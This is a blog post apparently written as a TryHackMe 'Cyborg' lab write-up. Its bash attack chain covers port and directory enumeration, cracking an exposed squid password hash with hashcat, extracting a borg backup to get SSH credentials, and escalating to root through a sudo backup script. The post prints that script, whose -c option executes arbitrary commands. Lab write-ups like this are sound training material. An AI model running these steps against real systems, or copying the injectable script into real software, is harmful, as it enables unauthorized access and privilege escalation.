@@ -1,0 +1,402 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>TryHackMe - Cyborg - xeunwa</title><meta name="Description" content="Borg Backups, some Bash Code Review"><meta property="og:url" content="https://xeunwa.github.io/cyborg/">
+  <meta property="og:site_name" content="xeunwa">
+  <meta property="og:title" content="TryHackMe - Cyborg">
+  <meta property="og:description" content="Borg Backups, some Bash Code Review">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-10-16T11:00:00+08:00">
+    <meta property="article:modified_time" content="2023-10-16T11:00:00+08:00">
+    <meta property="article:tag" content="Web Content Enumeration">
+    <meta property="article:tag" content="Cryptographic Failures">
+    <meta property="article:tag" content="Hash Cracking">
+    <meta property="article:tag" content="Sudo">
+    <meta property="article:tag" content="Code Review">
+    <meta property="article:tag" content="Bash">
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+  <meta name="twitter:title" content="TryHackMe - Cyborg">
+  <meta name="twitter:description" content="Borg Backups, some Bash Code Review">
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://xeunwa.github.io/cyborg/" /><link rel="prev" href="https://xeunwa.github.io/mothers-secret/" /><link rel="next" href="https://xeunwa.github.io/picoctf-2023/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe - Cyborg",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/xeunwa.github.io\/cyborg\/"
+        },"image": ["https:\/\/xeunwa.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "Web Content Enumeration, Cryptographic Failures, Hash Cracking, sudo, Code Review, bash","wordcount":  359 ,
+        "url": "https:\/\/xeunwa.github.io\/cyborg\/","datePublished": "2023-10-16T11:00:00+08:00","dateModified": "2023-10-16T11:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/avatars.githubusercontent.com\/u\/72879902?v=4"},"authors": [{
+                        "@type": "Person",
+                        "name": "xeunwa"                    
+                    }],"description": "Borg Backups, some Bash Code Review"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('black' === 'light' || 'black' === 'dark' || 'black' === 'black') setTheme('black'), saveTheme('black'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/web/"> web-writeups </a><a class="menu-item" href="/whoami/"> whoami </a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/web/" title="">web-writeups</a><a class="menu-item" href="/whoami/" title="">whoami</a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#attack-chain">Attack Chain</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TryHackMe - Cyborg</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><span class="author fas fa-user-circle fa-fw"></span><span class='screen-reader-text'>  </span><a href='https://xeunwa.github.io/authors/xeunwa'>xeunwa</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/tryhackme/"><i class="far fa-folder fa-fw"></i>TryHackMe</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/privesc/"><i class="far fa-folder fa-fw"></i>PrivEsc</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-10-16">2023-10-16</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-10-16">2023-10-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;359 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#attack-chain">Attack Chain</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>My attack chain for Cyborg. Web content enumeration, Cracking a borg backup and some bash code reivew.</p>
+<h1 id="attack-chain" class="headerLink">
+    <a href="#attack-chain" class="header-mark"></a>Attack Chain</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">ip</span><span class="o">=</span>&lt;redacted&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># recon</span>
+</span></span><span class="line"><span class="cl">nmap <span class="nv">$ip</span>
+</span></span><span class="line"><span class="cl">nmap <span class="nv">$ip</span> -sVC -p 22,80 -oN nmap-sVC-<span class="nv">$ip</span>.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># | Port | Service                              | </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># | ---- | ------------------------------------ | </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># | 22   | ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 | </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># | 80   | http Apache httpd 2.4.18             | </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster dir --url <span class="nv">$ip</span> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># --------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># /admin    (Status: 301) [Size: 312] [--&gt; http://10.10.239.18/admin/]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># /etc        (Status: 301) [Size: 310] [--&gt; http://10.10.239.18/etc/]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># /index.html                              (Status: 200) [Size: 11321]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http http://<span class="nv">$ip</span>/index.html &gt; http.html
+</span></span><span class="line"><span class="cl">http http://<span class="nv">$ip</span>/admin/ &gt; http<span class="nv">$ip</span>-admin.html
+</span></span><span class="line"><span class="cl">http http://<span class="nv">$ip</span>/etc/ &gt; http<span class="nv">$ip</span>-etc.html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># exploitation - hashcat</span>
+</span></span><span class="line"><span class="cl">http http://<span class="nv">$ip</span>/etc/squid/passwd <span class="p">|</span> cut -d<span class="s1">&#39;:&#39;</span> -f2 &gt; squid-passwd.hash
+</span></span><span class="line"><span class="cl">hashcat squid-passwd.hash --show
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">1600</span> squid-passwd.hash  /usr/share/wordlists/rockyou.txt -o squid-passwd-solved.txt
+</span></span><span class="line"><span class="cl">hashcat squid-passwd.hash --show
+</span></span><span class="line"><span class="cl"><span class="c1"># $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:s********</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># exploitation - borg backups &gt; ssh</span>
+</span></span><span class="line"><span class="cl">wget http://<span class="nv">$ip</span>/admin/archive.tar
+</span></span><span class="line"><span class="cl">tar -xvf archive.tar
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> home/field/dev
+</span></span><span class="line"><span class="cl">borg list final_archive
+</span></span><span class="line"><span class="cl">borg extract home/field/dev/final_archive::music_archive <span class="c1">#p:squidward</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat home/alex/Desktop/secret.txt
+</span></span><span class="line"><span class="cl">ssh alex@<span class="nv">$ip</span> <span class="c1">#p:S3*******3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># privEsc: sudo script </span>
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">cat /etc/mp3backups/backup.sh
+</span></span><span class="line"><span class="cl">sudo /etc/mp3backups/backup.sh -c <span class="s2">&#34;cat /root/root.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>backup.sh script utilized for privesc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">sudo find / -name <span class="s2">&#34;*.mp3&#34;</span> <span class="p">|</span> sudo tee /etc/mp3backups/backed_up_files.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">input</span><span class="o">=</span><span class="s2">&#34;/etc/mp3backups/backed_up_files.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#while IFS= read -r line</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#do</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#a=&#34;/etc/mp3backups/backed_up_files.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  b=$(basename $input)</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#echo</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  echo &#34;$line&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#done &lt; &#34;$input&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">getopts</span> c: flag
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">flag</span><span class="si">}</span><span class="s2">&#34;</span> in 
+</span></span><span class="line"><span class="cl">                c<span class="o">)</span> <span class="nv">command</span><span class="o">=</span><span class="si">${</span><span class="nv">OPTARG</span><span class="si">}</span><span class="p">;;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">esac</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">backup_files</span><span class="o">=</span><span class="s2">&#34;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Where to backup to.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">dest</span><span class="o">=</span><span class="s2">&#34;/etc/mp3backups/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create archive filename.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">hostname</span><span class="o">=</span><span class="k">$(</span>hostname -s<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">archive_file</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$hostname</span><span class="s2">-scheduled.tgz&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Print start status message.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Backing up </span><span class="nv">$backup_files</span><span class="s2"> to </span><span class="nv">$dest</span><span class="s2">/</span><span class="nv">$archive_file</span><span class="s2">&#34;</span><span class="nb">echo</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Backup the files using tar.</span>
+</span></span><span class="line"><span class="cl">tar czf <span class="nv">$dest</span>/<span class="nv">$archive_file</span> <span class="nv">$backup_files</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Print end status message.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Backup finished&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span><span class="k">$(</span><span class="nv">$command</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$cmd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-10-16</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="https://xeunwa.github.io/cyborg/" data-title="TryHackMe - Cyborg" data-hashtags="Web Content Enumeration,Cryptographic Failures,Hash Cracking,sudo,Code Review,bash"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Instapaper" data-sharer="instapaper" data-url="https://xeunwa.github.io/cyborg/" data-title="TryHackMe - Cyborg" data-description="Borg Backups, some Bash Code Review"><span data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web-content-enumeration/">Web Content Enumeration</a>,&nbsp;<a href="/tags/cryptographic-failures/">Cryptographic Failures</a>,&nbsp;<a href="/tags/hash-cracking/">Hash Cracking</a>,&nbsp;<a href="/tags/sudo/">Sudo</a>,&nbsp;<a href="/tags/code-review/">Code Review</a>,&nbsp;<a href="/tags/bash/">Bash</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/mothers-secret/" class="prev" rel="prev" title="TryHackMe - Mother&#39;s Secret"><i class="fas fa-angle-left fa-fw"></i>TryHackMe - Mother&#39;s Secret</a>
+            <a href="/picoctf-2023/" class="next" rel="next" title="picoCTF 2023 - web(2x) writeups">picoCTF 2023 - web(2x) writeups<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.131.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"data":{"desktop-header-typeit":"xeunwa","mobile-header-typeit":"xeunwa"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":300,"threshold":0.1,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
